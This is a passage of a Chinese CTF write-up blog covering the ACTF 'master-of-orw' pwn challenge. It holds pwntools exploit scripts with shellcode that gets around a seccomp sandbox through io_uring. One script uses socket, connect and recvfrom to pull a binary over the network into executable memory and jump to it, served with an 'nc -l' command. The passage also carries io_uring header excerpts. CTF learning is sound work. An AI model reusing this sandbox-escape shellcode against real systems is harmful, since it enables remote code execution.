class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&#x27;./master-of-orw&#x27;</span>)<br>    p = process(<span class="hljs-string">&quot;./master-of-orw&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>code1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov rsi, rdx</span><br><span class="hljs-string">        add rsi, 0x500</span><br><span class="hljs-string">        mov rdi, 0x10</span><br><span class="hljs-string">        push 425</span><br><span class="hljs-string">        pop rax</span><br><span class="hljs-string">        syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>code2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov byte ptr [rax], 0x12</span><br><span class="hljs-string">        mov dword ptr [rax+4], 0xffffff9c</span><br><span class="hljs-string">        mov r15, 0x67616c662f2e</span><br><span class="hljs-string">        push r15</span><br><span class="hljs-string">        mov qword ptr [rax+0x10], rsp</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        mov byte ptr [rax+0x40], 0x16</span><br><span class="hljs-string">        mov dword ptr [rax+0x44], 4</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop r15</span><br><span class="hljs-string">        sub r15, 0x100</span><br><span class="hljs-string">        mov qword ptr [rax+0x50], r15</span><br><span class="hljs-string">        mov byte ptr [rax+0x58], 0x30</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        mov byte ptr [rax+0x80], 0x17</span><br><span class="hljs-string">        mov dword ptr [rax+0x84], 1</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop r15</span><br><span class="hljs-string">        sub r15, 0x100</span><br><span class="hljs-string">        mov qword ptr [rax+0x90], r15</span><br><span class="hljs-string">        mov byte ptr [rax+0x98], 0x30</span><br><span class="hljs-string">        mov rcx, 3</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode = asm(code1, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>) + \<br>            asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x380</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x8001</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0</span>)) + \<br>            asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x380</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x8001</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x10000000</span>)) + \<br>            asm(code2, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>) + \<br>            asm(shellcraft.io_uring_enter(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>))<br><br>gdb.attach(p)<br>sl(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>能初始化但是任务提交不上去呜呜</p><h3 id="recvfrom！！"><a href="#recvfrom！！" class="headerlink" title="recvfrom！！"></a>recvfrom！！</h3><p>看了好几个师傅的wp发现都是用<code>recvfrom</code>做的，因为<code>socket、connect、recvfrom</code>都活着</p><p>先用gpt写一个poc，关掉pie，静态编译，建议加上-O3优化</p><p>用<code>mmap</code>把0x400000那边权限改了，建立socket连接后，把静态链接的程序读入0x400000处</p><p>最后jmp到传入进去的<code>main</code>函数</p><p>真tm妙啊，妈妈生的</p><p>Poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing/io_uring.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 256</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_params</span> <span class="hljs-title">params</span>;</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buffer[BUFSIZE];<br><br>    <span class="hljs-comment">// 初始化参数</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;params, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(params));<br>    <span class="hljs-keyword">if</span> (io_uring_queue_init_params(<span class="hljs-number">1</span>, &amp;ring, &amp;params) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_queue_init_params&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">// 配置open操作</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_openat(sqe, AT_FDCWD, <span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>   <br>    <span class="hljs-comment">// 提交open操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 配置read操作</span><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_read(sqe, <span class="hljs-number">5</span>, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交read操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br><br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交write操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    <span class="hljs-comment">// 等待操作完成</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_wait_cqe&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>   <br>    <span class="hljs-comment">// 提交所有操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 清理</span><br>    io_uring_cq_advance(&amp;ring, <span class="hljs-number">2</span>);<br>    io_uring_queue_exit(&amp;ring);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Socket_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">serv_addr</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    <span class="hljs-built_in">memset</span>(serv_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    serv_addr-&gt;sin_family = AF_INET;<br>    serv_addr-&gt;sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    serv_addr-&gt;sin_port = htons(<span class="hljs-number">8888</span>);<br>    print_binary(serv_addr,<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在终端开</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cat io_uring <span class="hljs-string">| nc -l 8888</span><br></code></pre></td></tr></table></figure><p>再执行exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&#x27;./master-of-orw&#x27;</span>)<br>    p = process(<span class="hljs-string">&quot;./master-of-orw&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>socket_struct = <span class="hljs-number">0x020022b87f000001</span><br>asm_socket = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax, 41</span><br><span class="hljs-string">mov rdi, 2</span><br><span class="hljs-string">mov rsi, 1</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>push_socket_struct = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov r15, 0x0100007fb8220002</span><br><span class="hljs-string">push r15</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>asm_connect = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdi, 3</span><br><span class="hljs-string">mov rdx, 0x10</span><br><span class="hljs-string">mov rax, 42</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>cyc_recv = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsi, 0x400000</span><br><span class="hljs-string">mov r14, 0xcfcc8</span><br><span class="hljs-string"></span><br><span class="hljs-string">again:</span><br><span class="hljs-string">mov edi, 3</span><br><span class="hljs-string">mov rdx, 0x1000</span><br><span class="hljs-string">mov r10d, 0</span><br><span class="hljs-string">xor r8d, r8d</span><br><span class="hljs-string">xor r9d, r9d</span><br><span class="hljs-string">mov eax, 45 ;// recvfrom</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add rsi, rax</span><br><span class="hljs-string">sub r14, rax</span><br><span class="hljs-string">cmp r14,0</span><br><span class="hljs-string">jge again</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x401620</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = asm(shellcraft.mmap(<span class="hljs-number">0x400000</span>,<span class="hljs-number">0x100000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">33</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) + \<br>            asm(asm_socket) + asm(push_socket_struct) + asm(asm_connect) + \<br>            asm(cyc_recv)<br><br><br><br>sl(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/7.png" alt="img"></p><h3 id="题目之外–about-io-uring"><a href="#题目之外–about-io-uring" class="headerlink" title="题目之外–about io_uring"></a>题目之外–about io_uring</h3><p>源码康<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/io_uring.h">这里</a></p><p>io_uring_op还挺丰富</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">io_uring_op</span> &#123;</span><br>IORING_OP_NOP,<br>IORING_OP_READV,<br>IORING_OP_WRITEV,<br>IORING_OP_FSYNC,<br>IORING_OP_READ_FIXED,<br>IORING_OP_WRITE_FIXED,<br>IORING_OP_POLL_ADD,<br>IORING_OP_POLL_REMOVE,<br>IORING_OP_SYNC_FILE_RANGE,<br>IORING_OP_SENDMSG,<br>IORING_OP_RECVMSG,<br>IORING_OP_TIMEOUT,<br>IORING_OP_TIMEOUT_REMOVE,<br>IORING_OP_ACCEPT,<br>IORING_OP_ASYNC_CANCEL,<br>IORING_OP_LINK_TIMEOUT,<br>IORING_OP_CONNECT,<br>IORING_OP_FALLOCATE,<br>IORING_OP_OPENAT,<br>IORING_OP_CLOSE,<br>IORING_OP_FILES_UPDATE,<br>IORING_OP_STATX,<br>IORING_OP_READ,<br>IORING_OP_WRITE,<br>IORING_OP_FADVISE,<br>IORING_OP_MADVISE,<br>IORING_OP_SEND,<br>IORING_OP_RECV,<br>IORING_OP_OPENAT2,<br>IORING_OP_EPOLL_CTL,<br>IORING_OP_SPLICE,<br>IORING_OP_PROVIDE_BUFFERS,<br>IORING_OP_REMOVE_BUFFERS,<br>IORING_OP_TEE,<br>IORING_OP_SHUTDOWN,<br>IORING_OP_RENAMEAT,<br>IORING_OP_UNLINKAT,<br>IORING_OP_MKDIRAT,<br>IORING_OP_SYMLINKAT,<br>IORING_OP_LINKAT,<br>IORING_OP_MSG_RING,<br>IORING_OP_FSETXATTR,<br>IORING_OP_SETXATTR,<br>IORING_OP_FGETXATTR,<br>IORING_OP_GETXATTR,<br>IORING_OP_SOCKET,<br>IORING_OP_URING_CMD,<br>IORING_OP_SEND_ZC,<br>IORING_OP_SENDMSG_ZC,<br><br><span class="hljs-comment">/* this goes last, obviously */</span><br>IORING_OP_LAST,<br>&#125;;<br></code></pre></td></tr></table></figure><p>找到了偏移量的设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_SQ_RING0ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_CQ_RING0x8000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_SQES0x10000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_PBUF_RING0x80000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_PBUF_SHIFT16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_MMAP_MASK0xf8000000ULL</span><br><br>IORING_OFF_SQ_RING：这是用于访问 Submission Queue Ring（SQ Ring）的偏移量。SQ Ring 用于存储I/O请求的提交队列<br><br>IORING_OFF_SQES：这是用于访问 Submission Queue Entry（SQE）的偏移量。SQE 是I/O请求的数据结构，用于描述I/O操作的各个参数。<br></code></pre></td></tr></table></figure><p>也就解释了为什么对应第一个mmap的offset&#x3D;0，第二个mmap的offset&#x3D;0x10000000</p><h2 id="qemu-playground"><a href="#qemu-playground" class="headerlink" title="qemu-playground"></a>qemu-playground</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>👴先声明，这是👴人生中第一个逆向题，👴连那个核心算法都没看明白。👴输入了原始数据试一下，再把得到的数据输进去，然后，就没有然后了，👴就拿到了flag</p><p><img src="/img/ACTF/8.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 